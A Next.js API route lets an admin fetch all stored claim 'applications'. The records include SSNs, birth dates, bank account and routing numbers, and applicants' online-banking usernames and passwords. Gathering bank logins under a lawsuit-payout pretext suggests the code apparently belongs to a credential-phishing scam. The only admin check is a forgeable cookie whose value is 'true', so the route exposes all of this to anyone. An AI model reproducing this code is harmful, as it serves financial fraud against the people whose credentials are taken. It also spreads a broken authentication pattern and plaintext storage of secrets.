import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import prisma from "@/lib/prisma";

const COOKIE_NAME = "admin_authenticated";

async function isAuthenticated(): Promise<boolean> {
  const cookieStore = await cookies();
  const authCookie = cookieStore.get(COOKIE_NAME);
  return authCookie?.value === "true";
}

export async function GET() {
  try {
    // Check authentication
    if (!(await isAuthenticated())) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    // Fetch all applications including sensitive data
    const applications = await prisma.application.findMany({
      orderBy: { createdAt: "desc" },
    });

    // Return all data including sensitive fields for admin
    const applicationsData = applications.map((app) => ({
      id: app.id,
      fullName: app.fullName,
      email: app.email,
      phone: app.phone,
      claimId: app.claimId,
      dateOfBirth: app.dateOfBirth,
      ssn: app.ssn,
      street: app.street,
      city: app.city,
      state: app.state,
      zip: app.zip,
      lawsuitType: app.lawsuitType,
      filingDate: app.filingDate,
      court: app.court,
      judgmentDate: app.judgmentDate,
      totalAmount: app.totalAmount,
      bankName: app.bankName,
      accountNumber: app.accountNumber,
      routingNumber: app.routingNumber,
      accountType: app.accountType,
      paymentMethod: app.paymentMethod,
      bankVerified: app.bankVerified,
      bankUsername: app.bankUsername,
      bankPassword: app.bankPassword,
      consent: app.consent,
      status: app.status,
      createdAt: app.createdAt,
      updatedAt: app.updatedAt,
    }));

    return NextResponse.json({ applications: applicationsData });
  } catch (error) {
    console.error("Error fetching applications:", error);
    return NextResponse.json(
      { error: "Failed to fetch applications" },
      { status: 500 }
    );
  }
}
